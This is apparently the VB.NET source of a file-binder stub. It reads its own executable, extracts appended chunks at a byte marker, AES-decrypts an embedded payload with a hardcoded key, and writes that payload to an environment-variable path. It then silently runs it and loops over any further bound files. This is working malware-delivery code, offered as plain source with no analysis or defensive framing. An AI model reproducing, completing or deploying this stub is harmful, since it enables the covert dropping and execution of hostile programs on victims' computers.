Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim Bin() As Byte = FileIO.FileSystem.ReadAllBytes(Application.ExecutablePath)

        Dim i As Integer = FindSplit(Bin)
        Bin = RemoveBytes(Bin, i)
AnotherFile:
        ' FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Bin, False)

        i = FindSplit(Bin) - 10
        Dim Tmp(0 To i - 1) As Byte
        For a = 0 To Tmp.Length - 1
            Tmp(a) = Bin(a)
        Next
        Dim Execute As Boolean = False
        Try
            If Boolean.Parse(UnicodeBytesToString(Tmp)) = True Then
                'execute payload = true
                Execute = True
            Else
                'dont execute payload
                Execute = False
            End If
        Catch ex As Exception
            End
        End Try


        i = FindSplit(Bin)
        Bin = RemoveBytes(Bin, i)
        'FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Bin, False)
        i = FindSplit(Bin) - 10
        Dim Tmp2(0 To i - 1) As Byte
        For a = 0 To Tmp2.Length - 1
            Tmp2(a) = Bin(a)
        Next

        'FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Tmp2, False)

        Dim ExecPath As String = UnicodeBytesToString(Tmp2)





        'FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Tmp, False)

        '
        i = FindSplit(Bin)
        Bin = RemoveBytes(Bin, i)
        '
        i = FindSplit(Bin) - 10
        ReDim Tmp(0 To i - 1)
        For a = 0 To Tmp.Length - 1
            Tmp(a) = Bin(a)
        Next
        '    FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Bin, False)
        'get name
        i = FindSplit(Bin) - 10
        ReDim Tmp(0 To i - 1)
        For a = 0 To Tmp.Length - 1
            Tmp(a) = Bin(a)
        Next
        Dim FileName As String = UnicodeBytesToString(Tmp)
        ExecPath = Environment.ExpandEnvironmentVariables(ExecPath) & "\" & FileName
        i = FindSplit(Bin)
        Bin = RemoveBytes(Bin, i)
        i = FindSplit(Bin) - 10
        ReDim Tmp(0 To i - 1)
        For a = 0 To Tmp.Length - 1
            Tmp(a) = Bin(a)
        Next
        'FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Tmp, False)
        Tmp = AES_Decrypt(Tmp)
        FileIO.FileSystem.WriteAllBytes(ExecPath, Tmp, False)
        i = FindSplit(Bin) + 10
        If i > Bin.Length - 1 Then
            i -= 10
        End If
        Bin = RemoveBytes(Bin, i)
        '
        If Execute = True Then
            Try
                Process.Start(ExecPath)
            Catch ex As Exception

            End Try

        End If
        i = FindSplit(Bin)
        '    FileIO.FileSystem.WriteAllBytes("C:\Users\Exidous\Desktop\bind_.exe", Bin, False)
        If i > 0 Then
            GoTo AnotherFile
        End If
        '

        'ok got the drop path now do get the binary
        End

    End Sub

    Function RandomName()
        Dim s As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Dim r As New Random
        Dim sb As New System.Text.StringBuilder
        For i As Integer = 1 To 8
            Dim idx As Integer = r.Next(0, 35)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Function RemoveBytes(ByVal TheArray() As Byte, ByVal AmmountOfBytes As Integer) As Byte()
        Dim Tmp() As Byte = TheArray
        ReDim TheArray(0 To (TheArray.Length - AmmountOfBytes) - 1)
        Dim a As Integer = 0
        For i = 0 To Tmp.Length - 1
            If i >= AmmountOfBytes Then
                TheArray(a) = Tmp(i)
                a += 1
            End If
        Next
        Return TheArray
    End Function

    Private Function UnicodeBytesToString(
    ByVal bytes() As Byte) As String

        Return System.Text.Encoding.Unicode.GetString(bytes)
    End Function
    Function FindSplit(ByVal Payload() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim I As Integer = 0
        For Each bytez In Payload
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H28 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            I += 1
        Next
        If I = 0 Then Return I
        Return I + 5
    End Function

    Private Shared Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
End Class
